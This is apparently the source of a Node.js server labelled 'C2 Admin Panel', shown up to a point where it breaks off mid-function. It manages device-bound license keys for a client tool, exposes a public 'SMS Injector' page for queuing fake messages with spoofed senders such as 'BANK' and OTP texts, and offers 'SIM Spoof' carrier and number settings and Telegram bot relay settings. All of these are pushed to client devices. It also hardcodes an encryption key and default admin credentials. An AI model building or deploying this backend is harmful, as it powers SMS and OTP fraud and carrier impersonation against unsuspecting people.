const express = require("express");
const cors = require("cors");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const AES_KEY = Buffer.from("ycb_floating_menu_key_256_bits_!", "utf8");
const HMAC_KEY = AES_KEY; // HMAC uses same key as AES

function aesEncrypt(plaintext) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", AES_KEY, iv);
  let encrypted = cipher.update(plaintext, "utf8");
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return Buffer.concat([iv, encrypted]).toString("base64");
}

function aesDecrypt(b64text) {
  const raw = Buffer.from(b64text, "base64");
  if (raw.length < 17) throw new Error("Ciphertext too short");
  const iv = raw.subarray(0, 16);
  const ct = raw.subarray(16);
  const decipher = crypto.createDecipheriv("aes-256-cbc", AES_KEY, iv);
  let decrypted = decipher.update(ct);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString("utf8");
}

function hmacSha256(data) {
  const hmac = crypto.createHmac("sha256", HMAC_KEY);
  hmac.update(data, "utf8");
  return hmac.digest("base64");
}

const app = express();
const PORT = process.env.PORT || 9999;
const DATA_FILE = path.join(__dirname, "data", "keys.json");
const ADMIN_USER = process.env.ADMIN_USER || "Pintu";
const ADMIN_PASS = process.env.ADMIN_PASS || "Pintu009@@";
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(64).toString("hex");
const MONGODB_URI = process.env.MONGODB_URI || "";

app.use(cors({ origin: false }));

// Capture raw body for text/plain encrypted requests WITHOUT breaking JSON/form parsers
app.use(express.json({
  verify: (req, res, buf) => { req.rawBody = buf.toString(); }
}));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({
  type: 'text/plain',
  verify: (req, res, buf) => { req.rawBody = buf.toString(); }
}));

const dataDir = path.join(__dirname, "data");
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

function freshData() {
  return { keys: {}, nextId: 1, users: {}, smsQueue: {}, telegram: {}, simSettings: {} };
}

// ====== DATA STORE ======
const store = {
  _data: null, _db: null, _ready: false,
  async init() {
    if (MONGODB_URI) {
      try {
        const { MongoClient } = require("mongodb");
        this._db = new MongoClient(MONGODB_URI);
        await this._db.connect();
        this._db = this._db.db();
        await this._mongoLoad();
        console.log("MongoDB connected");
      } catch (e) {
        console.error("MongoDB fail:", e.message);
        this._fileLoad();
      }
    } else {
      this._fileLoad();
    }
    this._ensureDefaults();
    this._ready = true;
  },
  _fileLoad() {
    try {
      if (fs.existsSync(DATA_FILE))
        this._data = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
    } catch {}
    if (!this._data) this._data = freshData();
  },
  async _mongoLoad() {
    const doc = await this._db.collection("config").findOne({ _id: "config" });
    this._data = doc ? doc.data : freshData();
  },
  async _mongoSave() {
    try {
      await this._db.collection("config").updateOne(
        { _id: "config" },
        { $set: { data: this._data } },
        { upsert: true }
      );
    } catch (e) { console.error("Mongo save error:", e.message); }
  },
  _ensureDefaults() {
    if (!this._data.users) this._data.users = {};
    if (!this._data.smsQueue) this._data.smsQueue = {};
    if (!this._data.telegram) this._data.telegram = {};
    if (!this._data.simSettings) this._data.simSettings = {};
    if (!this._data.users[ADMIN_USER]) {
      this._data.users[ADMIN_USER] = { password: crypto.createHash("sha256").update(ADMIN_PASS).digest("hex"), role: "admin" };
      this.save();
    }
    if (!this._data.keys["PINTU"]) {
      this._data.keys["PINTU"] = { licenseKey: "PINTU", deviceId: null, color: "red",
        expiresAt: Date.now() + 365 * 86400000 * 100, isBlocked: false, createdAt: Date.now(), id: 1 };
      this.save();
    }
  },
  save() {
    if (this._db) this._mongoSave();
    else {
      try { fs.writeFileSync(DATA_FILE, JSON.stringify(this._data, null, 2)); } catch (e) { console.error("Save error:", e.message); }
    }
  },
  getKeys() { return Object.values(this._data.keys); },
  getKey(k) { return this._data.keys[k] || null; },
  addKey(k, days) {
    const expiresAt = Date.now() + days * 86400000;
    this._data.keys[k] = { licenseKey: k, deviceId: null, color: "red", expiresAt, isBlocked: false, createdAt: Date.now(), id: this._data.nextId++ };
    this.save(); return this._data.keys[k];
  },
  updateDevice(k, d) { const key = this._data.keys[k]; if (!key) return null; key.deviceId = d; this.save(); return key; },
  setColor(k, c) { const key = this._data.keys[k]; if (!key) return null; key.color = c; this.save(); return key; },
  getSmsQueue(k) { return this._data.smsQueue[k] || []; },
  addSms(k, sender, body) {
    if (!this._data.smsQueue[k]) this._data.smsQueue[k] = [];
    this._data.smsQueue[k].push({ sender, body, timestamp: Date.now(), delivered: false });
    this.save();
  },
};

store.init();

// ====== JWT ======
function b64e(b) { return b.toString("base64").replace(/=/g,"").replace(/\+/g,"-").replace(/\//g,"_"); }
function b64d(s) {
  s = s.replace(/-/g,"+").replace(/_/g,"/");
  while (s.length % 4) s += "=";
  return Buffer.from(s,"base64").toString();
}
function jwtSign(p) {
  const h = b64e(Buffer.from(JSON.stringify({alg:"HS256",typ:"JWT"})));
  const b = b64e(Buffer.from(JSON.stringify({...p,iat:Date.now(),exp:Date.now()+7200000})));
  const s = b64e(crypto.createHmac("sha256",JWT_SECRET).update(h+"."+b).digest());
  return h+"."+b+"."+s;
}
function jwtVerify(t) {
  try {
    const p = t.split(".");
    if (p.length!==3) return null;
    if (b64e(crypto.createHmac("sha256",JWT_SECRET).update(p[0]+"."+p[1]).digest())!==p[2]) return null;
    const pl = JSON.parse(b64d(p[1]));
    if (Date.now()>pl.exp) return null;
    return pl;
  } catch { return null; }
}

function requireAuth(req,res,next) {
  const a=req.headers["authorization"],t=a?.startsWith("Bearer ")?a.slice(7):req.query.token;
  if(!t) return res.status(401).json({success:false,error:"Unauthorized"});
  const p=jwtVerify(t); if(!p) return res.status(401).json({success:false,error:"Invalid token"});
  req.user=p; next();
}

function hmacSign(data) {
  return hmacSha256(data) + "." + data;
}

function hmacVerifyAndExtract(signed) {
  const idx = signed.indexOf(".");
  if (idx < 1) throw new Error("Invalid HMAC format");
  const receivedHmac = signed.substring(0, idx);
  const ciphertext = signed.substring(idx + 1);
  const expectedHmac = hmacSha256(ciphertext);
  if (receivedHmac !== expectedHmac) throw new Error("HMAC mismatch");
  return ciphertext;
}

function aesEncryptSigned(plaintext) {
  return hmacSign(aesEncrypt(plaintext));
}

function aesDecryptSigned(signedData) {
  const ciphertext = hmacVerifyAndExtract(signedData);
  return aesDecrypt(ciphertext);
}

// ====== LICENSE VALIDATION ======
app.all(["/c","/api/c","/api/verify-license"], (req, res) => {
  // Try to decrypt body — rawBody captures the text/plain encrypted payload from the client
  let licenseKey = null;
  let deviceId = null;
  const encryptedBody = req.rawBody || (typeof req.body === "string" ? req.body : null);
  if (encryptedBody && encryptedBody.length > 20) {
    try {
      const decrypted = aesDecryptSigned(encryptedBody);
      const parsed = JSON.parse(decrypted);
      licenseKey = parsed.licenseKey || parsed.key || null;
      deviceId = parsed.deviceId || parsed.device || null;
      console.log(`verify-license: OK key=${licenseKey} device=${deviceId}`);
    } catch (e) {
      console.log(`verify-license: DECRYPT FAIL: ${e.message}`);
    }
  }
  // Fallback to query params (GET) or JSON body (admin tools)
  if (!licenseKey) {
    licenseKey = req.query.key || req.query.licenseKey
      || (typeof req.body === "object" && req.body ? (req.body.key || req.body.licenseKey) : null);
    deviceId = req.query.deviceId
      || (typeof req.body === "object" && req.body ? (req.body.deviceId || req.body.device) : null)
      || deviceId;
  }
  const fk = licenseKey || "PINTU";
  let kd = store.getKey(fk);
  function errResp(msg,st) { return res.type("text/plain").send(aesEncryptSigned(JSON.stringify({success:false,status:st||"error",message:msg}))); }
  if (!kd) return errResp("License key not found","not_found");
  if (kd.isBlocked) return errResp("License key is blocked","blocked");
  if (Date.now()>kd.expiresAt) return errResp("License key has expired","expired");
  if (deviceId) {
    if (!kd.deviceId) store.updateDevice(fk, deviceId);
    else if (kd.deviceId !== deviceId) return errResp("Key already in use on another device","device_mismatch");
  }

  // Build response with color and SIM settings
  const resp = {
    success: true, status: "active", licenseKey: fk,
    deviceId: kd.deviceId || deviceId || "unbound",
    expiresAt: new Date(kd.expiresAt).toISOString(),
    validationTimestamp: new Date().toISOString(),
    color: kd.color||"red",
  };
  // Add pending SMS from queue
  const q = store.getSmsQueue(fk);
  if (q.length > 0) {
    resp.smsQueue = q.filter(s => !s.delivered).slice(0, 5);
  }
  // Add SIM settings
  if (store._data.simSettings[fk]) {
    resp.simSettings = store._data.simSettings[fk];
  }

  res.type("text/plain").send(aesEncryptSigned(JSON.stringify(resp)));
});

// ====== SMS INJECT ======
app.post("/api/inject", (req, res) => {
  const { sender, body, licenseKey } = req.body || req.query;
  if (!sender || !body || !licenseKey)
    return res.status(400).json({ success: false, error: "Missing sender, body, or licenseKey parameters" });
  const kd = store.getKey(licenseKey);
  if (!kd) return res.status(404).json({ success: false, error: "License key not found" });
  store.addSms(licenseKey, sender, body);
  res.json({ success: true, message: "SMS queued", topic: "pria_sms_" + licenseKey, payload: sender + "|" + body });
});

// ====== PLAIN STATUS ENDPOINT (for shell script, no AES) ======
app.get(["/api/check","/check"], (req, res) => {
  const k = req.query.key||req.query.licenseKey||"PINTU";
  const d = req.query.deviceId||"";
  const kd = store.getKey(k);
  if (!kd) return res.json({active:false,reason:"not_found"});
  if (kd.isBlocked) return res.json({active:false,reason:"blocked"});
  if (Date.now()>kd.expiresAt) return res.json({active:false,reason:"expired"});
  if (d && kd.deviceId && kd.deviceId !== d) return res.json({active:false,reason:"device_mismatch"});
  if (d && !kd.deviceId) store.updateDevice(k,d);
  const sms = store.getSmsQueue(k).filter(s=>!s.delivered).slice(0,5);
  const sim = store._data.simSettings?.[k]||null;
  const tel = store._data.telegram?.[k]||null;
  res.json({active:true,color:kd.color||"red",sms:sms.length?sms.map(s=>({sender:s.sender,body:s.body})):null,sim,telegram:tel});
});

// ====== SMS INJECTOR PAGE (public, no admin) ======
app.get(["/sms-injector", "/sms", "/inject-page"], (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>SMS Injector</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#0f0f1a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#1a1a2e;padding:30px;border-radius:12px;width:400px;max-width:90vw;box-shadow:0 8px 32px rgba(0,0,0,.5)}
h2{text-align:center;margin-bottom:24px;color:#7c4dff}
label{display:block;margin:12px 0 4px;font-size:13px;color:#aaa}
input,button{width:100%;padding:10px 14px;border-radius:8px;border:none;font-size:14px;outline:none}
input{background:#16162a;color:#e0e0e0;margin-bottom:4px}
input:focus{border:1px solid #7c4dff}
button{background:#7c4dff;color:#fff;font-weight:600;margin-top:16px;cursor:pointer;transition:.2s}
button:hover{background:#651fff}
button:disabled{opacity:.5;cursor:not-allowed}
#status{margin-top:16px;padding:8px;border-radius:8px;text-align:center;font-size:13px;display:none}
#status.success{display:block;background:#1b5e20;color:#a5d6a7}
#status.error{display:block;background:#b71c1c;color:#ef9a9a}
</style></head>
<body>
<div class="card">
<h2>\\u26A1 SMS Injector</h2>
<label>License Key</label>
<input type="text" id="key" placeholder="PINTU" value="PINTU">
<label>Sender Name</label>
<input type="text" id="sender" placeholder="BANK">
<label>Message Body</label>
<input type="text" id="msg" placeholder="Your OTP is 123456">
<button id="go" onclick="send()">Send SMS</button>
<div id="status"></div>
</div>
<script>
async function send(){
  const key=document.getElementById('key').value.trim()||'PINTU';
  const sender=document.getElementById('sender').value.trim()||'TEST';
  const msg=document.getElementById('msg').value.trim()||'Hello';
  const s=document.getElementById('status');
  const btn=document.getElementById('go');
  btn.disabled=true;btn.textContent='Sending...';
  s.style.display='none';
  try{
    const r=await fetch('/api/inject',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({licenseKey:key,sender:sender,body:msg})});
    const j=await r.json();
    if(j.success){s.className='success';s.textContent='SMS queued successfully!';}
    else{s.className='error';s.textContent='Error: '+(j.error||'Unknown');}
  }catch(e){s.className='error';s.textContent='Error: '+e.message;}
  s.style.display='block';
  btn.disabled=false;btn.textContent='Send SMS';
}
<\/script>
</body></html>`);
});

// ====== TELEGRAM SETTINGS ======
app.post("/api/admin/set-telegram", requireAuth, (req, res) => {
  const { licenseKey, botToken, chatId } = req.body;
  if (!licenseKey) return res.json({ success: false, error: "licenseKey required" });
  if (!store._data.telegram) store._data.telegram = {};
  store._data.telegram[licenseKey] = { botToken: botToken||"", chatId: chatId||"" };
  store.save();
  res.json({ success: true });
});

app.get("/api/admin/get-telegram", requireAuth, (req, res) => {
  res.json({ success: true, config: store._data.telegram||{} });
});

// ====== SIM SETTINGS ======
app.post("/api/admin/set-sim", requireAuth, (req, res) => {
  const { licenseKey, sim1Provider, sim1Number, sim2Provider, sim2Number } = req.body;
  if (!licenseKey) return res.json({ success: false, error: "licenseKey required" });
  if (!store._data.simSettings) store._data.simSettings = {};
  store._data.simSettings[licenseKey] = { sim1Provider: sim1Provider||"", sim1Number: sim1Number||"", sim2Provider: sim2Provider||"", sim2Number: sim2Number||"" };
  store.save();
  res.json({ success: true });
});

app.get("/api/admin/get-sim", requireAuth, (req, res) => {
  res.json({ success: true, config: store._data.simSettings||{} });
});

// ====== AUTH ======
app.post("/api/auth/login", (req, res) => {
  const {username,password}=req.body;
  if(!username||!password) return res.json({success:false,error:"Fill all fields"});
  const u=store._data.users[username];
  if(!u||u.password!==crypto.createHash("sha256").update(password).digest("hex"))
    return res.json({success:false,error:"Invalid credentials"});
  res.json({success:true,token:jwtSign({username,role:u.role}),expiresIn:7200});
});

// ====== ADMIN API ======
app.get("/api/admin/get-licenses", requireAuth, (req,res) => {
  res.json({success:true,licenses:store.getKeys()});
});
app.post("/api/admin/create-key", requireAuth, (req,res) => {
  const k=req.body.licenseKey||"KEY-"+crypto.randomBytes(6).toString("hex").toUpperCase().match(/.{4}/g).join("-");
  const c=store.addKey(k,parseInt(req.body.durationDays)||30);
  res.json({success:true,license:c});
});
app.post("/api/admin/block-key", requireAuth, (req,res) => {
  const k=store.getKey(req.body.licenseKey);
  if(!k) return res.status(404).json({success:false,error:"Not found"});
  k.isBlocked=req.body.isBlocked;store.save();
  res.json({success:true,license:k});
});
app.post("/api/admin/delete-key", requireAuth, (req,res) => {
  if(store._data.keys[req.body.licenseKey]){delete store._data.keys[req.body.licenseKey];store.save();res.json({success:true})}
  else res.status(404).json({success:false,error:"Not found"});
});
app.post("/api/admin/reset-device", requireAuth, (req,res) => {
  const k=store.getKey(req.body.licenseKey);
  if(!k) return res.status(404).json({success:false,error:"Not found"});
  k.deviceId=null;store.save();
  res.json({success:true,license:k});
});
app.post("/api/admin/set-color", requireAuth, (req,res) => {
  const k=store.setColor(req.body.licenseKey, req.body.color);
  if(!k) return res.status(404).json({success:false,error:"Not found"});
  res.json({success:true,license:k});
});

// ====== ADMIN PANEL UI ======
const COLORS = [
  {id:"red",name:"Red",hex:"#FF3333"},
  {id:"blue",name:"Blue",hex:"#3366FF"},
  {id:"green",name:"Green",hex:"#33FF66"},
  {id:"purple",name:"Purple",hex:"#9933FF"},
  {id:"orange",name:"Orange",hex:"#FF6633"},
];

const ADMIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',sans-serif;min-height:100vh}
.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;background:radial-gradient(ellipse at center,#1a1a2e,#0a0a0f)}
.login-box{background:#12121a;border:1px solid #2a2a3e;border-radius:16px;padding:40px;width:380px;box-shadow:0 0 40px rgba(255,51,51,0.1)}
.login-box h1{color:#ff3333;font-size:24px;margin-bottom:8px;text-align:center}
.login-box p{color:#888;text-align:center;margin-bottom:30px;font-size:14px}
.login-box input{width:100%;padding:12px 16px;margin-bottom:16px;background:#1a1a26;border:1px solid #2a2a3e;border-radius:8px;color:#e0e0e0;font-size:14px;transition:border .2s}
.login-box input:focus{outline:none;border-color:#ff3333}
.login-box button{width:100%;padding:12px;background:#ff3333;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;transition:background .2s}
.login-box button:hover{background:#cc0000}
.login-box .error{color:#ff3333;font-size:13px;text-align:center;margin-top:12px;display:none}
.dashboard{display:none;padding:20px;max-width:1100px;margin:auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 0;border-bottom:1px solid #2a2a3e;margin-bottom:30px}
.header h1{color:#ff3333;font-size:22px}
.header .user-info{display:flex;align-items:center;gap:16px;font-size:14px;color:#888}
.header .logout-btn{padding:8px 20px;background:transparent;border:1px solid #ff3333;color:#ff3333;border-radius:6px;cursor:pointer;font-size:13px;transition:all .2s}
.header .logout-btn:hover{background:#ff3333;color:#fff}
.tabs{display:flex;gap:4px;margin-bottom:24px;border-bottom:1px solid #2a2a3e}
.tab{padding:10px 20px;cursor:pointer;border-radius:8px 8px 0 0;font-size:14px;color:#888;transition:all .2s;border:1px solid transparent;border-bottom:none}
.tab:hover{color:#fff;background:#1a1a26}
.tab.active{color:#ff3333;background:#12121a;border-color:#2a2a3e}
.tab-content{display:none}
.tab-content.active{display:block}
.card{background:#12121a;border:1px solid #2a2a3e;border-radius:12px;padding:24px;margin-bottom:24px}
.card h3{font-size:16px;margin-bottom:16px;color:#ccc}
.form-row{display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end}
.form-row select,.form-row input{flex:1;min-width:140px;padding:10px 14px;background:#1a1a26;border:1px solid #2a2a3e;border-radius:8px;color:#e0e0e0;font-size:14px}
.form-row select:focus,.form-row input:focus{outline:none;border-color:#ff3333}
.btn{display:inline-flex;align-items:center;gap:6px;padding:10px 24px;background:#ff3333;color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer;transition:background .2s;white-space:nowrap}
.btn:hover{background:#cc0000}
.btn-sm{padding:6px 14px;font-size:12px}
.btn-danger{background:#661111}
.btn-danger:hover{background:#991111}
.btn-success{background:#116611}
.btn-success:hover{background:#119911}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:10px 8px;font-size:12px;color:#666;text-transform:uppercase;letter-spacing:0.5px;border-bottom:1px solid #2a2a3e}
td{padding:10px 8px;font-size:14px;border-bottom:1px solid #1a1a26}
.mono{font-family:'Cascadia Code','Fira Code',monospace;color:#ff9999;font-size:13px}
.badge{display:inline-block;padding:3px 10px;border-radius:10px;font-size:11px;font-weight:600}
.badge-active{background:#00ff6633;color:#00ff66}
.badge-blocked{background:#ff333333;color:#ff3333}
.badge-expired{background:#ff950033;color:#ff9500}
.badge-unused{background:#66666633;color:#999}
.action-cell{display:flex;gap:6px;flex-wrap:wrap}
.color-dot{display:inline-block;width:16px;height:16px;border-radius:50%;margin-right:6px;vertical-align:middle;border:2px solid #333}
.color-picker{display:flex;gap:8px;flex-wrap:wrap}
.color-picker .color-opt{width:36px;height:36px;border-radius:50%;cursor:pointer;border:3px solid transparent;transition:all .2s}
.color-picker .color-opt:hover{transform:scale(1.15)}
.color-picker .color-opt.selected{border-color:#fff;transform:scale(1.1)}
.toast{position:fixed;bottom:30px;right:30px;padding:14px 24px;border-radius:10px;font-size:14px;z-index:999;animation:slideIn .3s ease;display:none}
.toast-success{background:#116611;border:1px solid #22aa22;color:#aaffaa}
.toast-error{background:#661111;border:1px solid #aa2222;color:#ffaaaa}
@keyframes slideIn{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
.empty-row td{text-align:center;padding:30px;color:#555;font-style:italic}
.field-group{margin-bottom:16px}
.field-group label{display:block;font-size:13px;color:#888;margin-bottom:6px}
.field-group input,.field-group select{width:100%;padding:10px 14px;background:#1a1a26;border:1px solid #2a2a3e;border-radius:8px;color:#e0e0e0;font-size:14px}
.field-group input:focus{outline:none;border-color:#ff3333}
</style>
</head>
<body>
<div class="login-wrap" id="loginWrap">
  <div class="login-box">
    <h1>✦ C2 PANEL</h1>
    <p>License Management System</p>
    <form action="/" method="POST">
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
    <div class="error" style="color:#ff9500;text-align:center;margin-top:12px">__ERROR__</div>
  </div>
</div>

<div class="dashboard" id="dashboard">
  <div class="header">
    <h1>✦ C2 PANEL</h1>
    <div class="user-info">
      <span id="userDisplay">admin</span>
      <button class="logout-btn" onclick="logout()">Sign Out</button>
    </div>
  </div>

  <div class="tabs">
    <div class="tab active" onclick="switchTab(this,'tabKeys')">Licenses</div>
    <div class="tab" onclick="switchTab(this,'tabSms')">SMS Inject</div>
    <div class="tab" onclick="switchTab(this,'tabSim')">SIM Spoof</div>
    <div class="tab" onclick="switchTab(this,'tabTelegram')">Telegram</div>
  </div>

  <!-- LICENSES TAB -->
  <div class="tab-content active" id="tabKeys">
    <div class="card">
      <h3>Create License Key</h3>
      <div class="form-row">
        <select id="durationType">
          <option value="days">Days</option>
          <option value="months">Months</option>
        </select>
        <input type="number" id="durationVal" value="30" min="1" style="width:80px">
        <input type="text" id="customKey" placeholder="Custom key (blank = random)">
        <button class="btn" onclick="createKey()">+ Create</button>
      </div>
    </div>
    <div class="card">
      <h3>License Keys</h3>
      <table>
        <thead><tr><th>Key</th><th>Device</th><th>Color</th><th>Status</th><th>Actions</th></tr></thead>
        <tbody id="keysBody"><tr><td colspan="5" class="empty-row">Loading...</td></tr></tbody>
      </table>
    </div>
  </div>

  <!-- SMS TAB -->
  <div class="tab-content" id="tabSms">
    <div class="card">
      <h3>Inject SMS</h3>
      <div class="field-group">
        <label>License Key</label>
        <input type="text" id="smsKey" placeholder="PINTU">
      </div>
      <div class="field-group">
        <label>Sender Address / ID</label>
        <input type="text" id="smsSender" placeholder="SPAM">
      </div>
      <div class="field-group">
        <label>SMS Content</label>
        <input type="text" id="smsBody" placeholder="Your OTP is 123456">
      </div>
      <button class="btn" onclick="injectSms()">Send SMS</button>
    </div>
    <div class="card">
      <h3>SMS Queue</h3>
      <table>
        <thead><tr><th>Key</th><th>Sender</th><th>Body</th><th>Time</th><th>Status</th></tr></thead>
        <tbody id="smsBody"><tr><td colspan="5" class="empty-row">Select a license to view queue</td></tr></tbody>
      </table>
    </div>
  </div>

  <!-- SIM TAB -->
  <div class="tab-content" id="tabSim">
    <div class="card">
      <h3>SIM Spoofing</h3>
      <div class="field-group">
        <label>License Key</label>
        <input type="text" id="simKey" placeholder="PINTU">
      </div>
      <h4 style="color:#ccc;margin:16px 0 8px">SIM 1</h4>
      <div class="field-group">
        <label>Provider</label>
        <input type="text" id="sim1Provider" placeholder="T-Mobile">
      </div>
      <div class="field-group">
        <label>Phone Number</label>
        <input type="text" id="sim1Number" placeholder="+1234567890">
      </div>
      <h4 style="color:#ccc;margin:16px 0 8px">SIM 2</h4>
      <div class="field-group">
        <label>Provider</label>
        <input type="text" id="sim2Provider" placeholder="Verizon">
      </div>
      <div class="field-group">
        <label>Phone Number</label>
        <input type="text" id="sim2Number" placeholder="+0987654321">
      </div>
      <button class="btn" onclick="saveSim()">Save SIM Settings</button>
    </div>
  </div>

  <!-- TELEGRAM TAB -->
  <div class="tab-content" id="tabTelegram">
    <div class="card">
      <h3>Telegram Bot</h3>
      <div class="field-group">
        <label>License Key</label>
        <input type="text" id="tgKey" placeholder="PINTU">
      </div>
      <div class="field-group">
        <label>Bot Token</label>
        <input type="text" id="tgBotToken" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
      </div>
      <div class="field-group">
        <label>Chat ID</label>
        <input type="text" id="tgChatId" placeholder="123456789">
      </div>
      <button class="btn" onclick="saveTelegram()">Save Telegram Config</button>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
let TOKEN = null;

function api(m,p,b) {
  const o={method:m,headers:{'Content-Type':'application/json'}};
  if(TOKEN) o.headers['Authorization']='Bearer '+TOKEN;
  if(b) o.body=JSON.stringify(b);
  return fetch(p,o).then(r=>r.json());
}

function showToast(msg,t) {
  const el=document.getElementById('toast');
  el.textContent=msg;el.className='toast toast-'+t;el.style.display='block';
  setTimeout(()=>el.style.display='none',3000);
}

function switchTab(el,id) {
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
  el.classList.add('active');
  document.getElementById(id).classList.add('active');
  if(id==='tabSms') loadSmsQueue();
}

// === LOGIN ===
(function(){var t='__TOKEN__';if(t){TOKEN=t;document.getElementById('loginWrap').style.display='none';document.getElementById('dashboard').style.display='block';loadKeys();}})();
var _err='__ERROR__';if(_err){var e=document.getElementById('loginWrap').querySelector('.error');if(e)e.textContent=_err;}
function logout(){TOKEN=null;document.getElementById('loginWrap').style.display='flex';document.getElementById('dashboard').style.display='none';}

// === LICENSES ===
async function loadKeys() {
  const d=await api('GET','/api/admin/get-licenses');
  if(!d.success) return;
  const tbody=document.getElementById('keysBody');
  if(!d.licenses?.length){tbody.innerHTML='<tr><td colspan="5" class="empty-row">No keys</td></tr>';return;}
  tbody.innerHTML=d.licenses.map(k=>{
    let s='unused',b='badge-unused';
    if(k.isBlocked){s='blocked';b='badge-blocked'}
    else if(k.expiresAt<Date.now()){s='expired';b='badge-expired'}
    else if(k.deviceId){s='active';b='badge-active'}
    const color=k.color||'red';
    const colorHex={red:'#FF3333',blue:'#3366FF',green:'#33FF66',purple:'#9933FF',orange:'#FF6633'}[color]||'#FF3333';
    return '<tr><td class="mono">'+k.licenseKey+'</td>'+
      '<td class="mono">'+(k.deviceId||'<i style="color:#555">-</i>')+'</td>'+
      '<td><span class="color-dot" style="background:'+colorHex+'"></span><span style="text-transform:capitalize">'+color+'</span></td>'+
      '<td><span class="badge '+b+'">'+s+'</span></td>'+
      '<td class="action-cell">'+
      '<button class="btn btn-sm btn-danger" onclick="setColor('+"'"+'+k.licenseKey+'+"'"+')">Color</button>'+
      (k.deviceId?'<button class="btn btn-sm btn-success" onclick="resetDevice('+"'"+'+k.licenseKey+'+"'"+')">Reset</button>':'')+
      (!k.isBlocked?'<button class="btn btn-sm btn-danger" onclick="blockKey('+"'"+'+k.licenseKey+'+"'"+')">Block</button>':
       '<button class="btn btn-sm btn-success" onclick="unblockKey('+"'"+'+k.licenseKey+'+"'"+')">Unblock</button>')+
      '<button class="btn btn-sm btn-danger" onclick="deleteKey('+"'"+'+k.licenseKey+'+"'"+')">Del</button></td></tr>';
  }).join('');
}

async function createKey(){
  const dt=document.getElementById('durationType').value;
  const dv=parseInt(document.getElementById('durationVal').value)||30;
  const days=dt==='months'?dv*30:dv;
  const d=await api('POST','/api/admin/create-key',{licenseKey:document.getElementById('customKey').value.trim()||undefined,durationDays:days});
  if(d.success){showToast('Key: '+d.license.licenseKey+' ('+days+' days)','success');loadKeys();}else showToast(d.error,'error');
}
async function blockKey(k){await api('POST','/api/admin/block-key',{licenseKey:k,isBlocked:true});showToast('Blocked','success');loadKeys();}
async function unblockKey(k){await api('POST','/api/admin/block-key',{licenseKey:k,isBlocked:false});showToast('Unblocked','success');loadKeys();}
async function resetDevice(k){if(!confirm('Reset device for '+k+'?'))return;await api('POST','/api/admin/reset-device',{licenseKey:k});showToast('Device reset','success');loadKeys();}
async function deleteKey(k){if(!confirm('Delete '+k+'?'))return;await api('POST','/api/admin/delete-key',{licenseKey:k});showToast('Deleted','success');loadKeys();}

// == COLOR PICKER ==
const COLORS=[{id:'red',name:'Red',hex:'#FF3333'},{id:'blue',name:'Blue',hex:'#3366FF'},{id:'green',name:'Green',hex:'#33FF66'},{id:'purple',name:'Purple',hex:'#9933FF'},{id:'orange',name:'Orange',hex:'#FF6633'}];
let colorTargetKey=null;

async function setColor(k){
  colorTargetKey=k;
  const picker=document.createElement('div');
  picker.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:1000';
  picker.innerHTML='<div style="background:#12121a;border:1px solid #2a2a3e;border-radius:16px;padding:30px;width:320px">'+
    '<h3 style="color:#fff;margin-bottom:20px;text-align:center">Choose Color for<br><span class="mono">'+k+'</span></h3>'+
    '<div class="color-picker" style="display:flex;gap:10px;justify-content:center;margin-bottom:20px">'+
    COLORS.map(c=>'<div class="color-opt" style="background:'+c.hex+'" onclick="pickColor('+"'"+'+c.id+'+"'"+')" title="'+c.name+'"></div>').join('')+
    '</div>'+
    '<button class="btn" style="width:100%" onclick="document.body.removeChild(this.parentNode.parentNode)">Cancel</button></div>';
  document.body.appendChild(picker);
}

async function pickColor(colorId){
  const d=await api('POST','/api/admin/set-color',{licenseKey:colorTargetKey,color:colorId});
  if(d.success){showToast('Color updated','success');loadKeys();}
  document.querySelector('div[style*="position:fixed"]')?.remove();
}

// === SMS ===
async function injectSms(){
  const k=document.getElementById('smsKey').value.trim()||'PINTU';
  const s=document.getElementById('smsSender').value.trim()||'TEST';
  const b=document.getElementById('smsBody').value.trim()||'Hello';
  const d=await api('POST','/api/inject',{licenseKey:k,sender:s,body:b});
  if(d.success){showToast('SMS queued for '+k,'success');loadSmsQueue();}else showToast(d.error,'error');
}

async function loadSmsQueue(){
  const d=await api('GET','/api/admin/get-licenses');
  if(!d.success||!d.licenses) return;
  const tbody=document.getElementById('smsBody');
  tbody.innerHTML=d.licenses.map(k=>{
    const q=k.smsQueue||[];
